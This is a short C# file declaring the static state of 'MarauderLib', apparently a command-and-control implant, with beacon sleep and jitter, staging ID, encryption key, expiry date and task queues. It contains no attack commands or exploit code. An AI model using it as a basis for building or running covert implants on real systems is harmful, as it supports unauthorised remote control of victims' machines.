using System;
using System.Collections.Generic;
using MarauderLib.Services;

namespace MarauderLib.Objects
{
    public static class State
    {
        public static string Id;
        public static string PayloadName;
        public static string StagingId;
        public static string Key;    
        public static int Sleep;
        public static double Jitter;
        public static int MaxAttempts;
        public static bool Debug = false;
        public static DateTime? ExpirationDate;
        internal static string LastTaskName;
        internal static List<TaskResult> ResultQueue = new List<TaskResult>();
        internal static List<RunningTask> RunningTasks = new List<RunningTask>();
        internal static CryptoService CryptoService;
        internal static CommandService CommandService;
    }
}